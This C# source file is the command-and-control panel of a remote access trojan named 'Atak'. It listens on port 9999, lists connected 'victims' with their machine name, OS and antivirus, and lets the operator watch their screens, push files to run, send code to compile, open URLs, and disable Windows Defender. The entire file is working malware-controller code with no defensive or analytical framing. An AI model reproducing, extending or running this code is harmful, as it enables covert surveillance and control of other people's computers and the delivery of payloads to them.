﻿using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net.Sockets;
using System.Net;
using System.IO;
using Microsoft.VisualBasic;
using System.Text.RegularExpressions;

namespace Atak
{
    public partial class MainForm : Form
    {
        List<Victims> victimList = new List<Victims>();
        Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
        private byte[] buffer = new byte[short.MaxValue];

        public MainForm()
        {
            InitializeComponent();
        }
        private void MainForm_Load(object sender, EventArgs e)
        {
            connect(9999);
        }
        private void timer1_Tick(object sender, EventArgs e)
        {
            try
            {
                foreach (Victims victim in victimList.ToList<Victims>())
                {
                    try
                    {
                        victim.socket.Send(new byte[1]);
                    }
                    catch (Exception)
                    {
                        foreach (ListViewItem item in VictimsListView.Items)
                        {
                            if (item.Text == victim.ip)
                            {
                                VictimsListView.Items.Remove(item);
                                victimList.Remove(victim);
                            }
                        }
                    }
                }
            }
            catch (Exception)
            {
            }
        }

        void clientLogon(IAsyncResult res)
        {
            try
            {
                Socket socketLogon = socket.EndAccept(res);
                socketLogon.BeginReceive(buffer, 0, buffer.Length, SocketFlags.None, new AsyncCallback(clientGetResult), socketLogon);
                socket.BeginAccept(new AsyncCallback(clientLogon), null);
            }
            catch (Exception)
            {
            }
        }
        void clientGetResult(IAsyncResult res)
        {
            try
            {
                Socket socket = (Socket)res.AsyncState;
                int len = socket.EndReceive(res);
                string data = Encoding.UTF8.GetString(buffer, 0, len);
                string[] sData = data.Split('|');

                switch (sData[0])
                {
                    case "CONN":
                        Invoke(new _clientLogon(addList), socket, sData[1], sData[2], sData[3], sData[4], sData[5]);
                        break;
                    case "SCRPNG":
                        byte[] buf = new byte[int.Parse(sData[1])];
                        socket.Receive(buf, buf.Length, SocketFlags.None);
                        using (MemoryStream scr = new MemoryStream())
                        {
                            scr.Write(buf, 0, buf.Length);
                            ((Screen)(Application.OpenForms["Screen"])).pictureBox1.Image = (Bitmap)Image.FromStream(scr);
                            scr.SetLength(0);
                        }
                        GC.Collect();
                        break;
                }

                socket.BeginReceive(buffer, 0, buffer.Length, SocketFlags.None, new AsyncCallback(clientGetResult), socket);
            }
            catch (Exception)
            {
            }
        }
        public delegate void _clientLogon(Socket _socket, string _id, string _machineName, string _ip, string _os, string _anti);
        public void addList(Socket socket, string id, string machineName, string ip, string os, string anti)
        {
            victimList.Add(new Victims(socket, id, ip, os, anti));
            ListViewItem item = new ListViewItem(ip);
            item.SubItems.Add(id);
            item.SubItems.Add(machineName);
            item.SubItems.Add(os);
            item.SubItems.Add(anti);
            VictimsListView.Items.Add(item);
        }                 

        private void sendMessageBoxToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Victims victim in victimList)
            {
                if (victim.ip == VictimsListView.SelectedItems[0].Text)
                {
                    Message msg = new Message(victim.socket);
                    msg.Show();
                }
            }
        }
        private void watchScreenToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Victims victim in victimList)
            {
                if (victim.ip == VictimsListView.SelectedItems[0].Text)
                {
                    victim.socket.Send(Encoding.UTF8.GetBytes("SCR|1"));
                    Screen screen = new Screen(victim.socket);
                    screen.Show();
                }
            }
        }
        private void closeServerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Victims victim in victimList)
            {
                if (victim.ip == VictimsListView.SelectedItems[0].Text)
                {
                    victim.socket.Send(Encoding.UTF8.GetBytes("CLOSE"));
                }
            }
        }
        private void uploadFileAndRunToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Victims victim in victimList)
            {
                if (victim.ip == VictimsListView.SelectedItems[0].Text)
                {              
                    OpenFileDialog file = new OpenFileDialog();
                    file.FilterIndex = 2;
                    file.RestoreDirectory = true;
                    file.CheckFileExists = false;
                    file.Title = "Atak";
                    file.ShowDialog();

                    string ext = Path.GetExtension(file.FileName);
                    byte[] fileBytes = File.ReadAllBytes(file.FileName);
                    victim.socket.Send(Encoding.UTF8.GetBytes("FILE|" + fileBytes.Length.ToString() + "|" + ext));
                    victim.socket.Send(fileBytes, fileBytes.Length, SocketFlags.None);
                }
            }
        }
        private void sendCodeToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Victims victim in victimList)
            {
                if (victim.ip == VictimsListView.SelectedItems[0].Text)
                {
                    Compiler compiler = new Compiler(victim.socket);
                    compiler.Show();
                }
            }
        }
        private void visitSiteToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Victims victim in victimList)
            {
                if (victim.ip == VictimsListView.SelectedItems[0].Text)
                {
                    string url = Interaction.InputBox("Url to go: ex(http[s]://google.com)", "Atak");
                    if (isValidURL(url))
                    {
                        victim.socket.Send(Encoding.UTF8.GetBytes("START|" + url));
                    }
                    else
                    {
                        MessageBox.Show("Invalid url", "Atak", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                    }
                    
                }
            }
        }
        private void disableDefenderAdminToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Victims victim in victimList)
            {
                if (victim.ip == VictimsListView.SelectedItems[0].Text)
                {
                    victim.socket.Send(Encoding.UTF8.GetBytes("DEFENDER"));
                }
            }
        }

        void connect(int port)
        {
            socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            socket.Bind(new IPEndPoint(IPAddress.Any, port));
            socket.Listen(int.MaxValue);
            socket.BeginAccept(new AsyncCallback(clientLogon), null);
        }
        bool isValidURL(string url)
        {
            Regex re = new Regex("^(http|https)://");
            return re.IsMatch(url);
        }
    }
}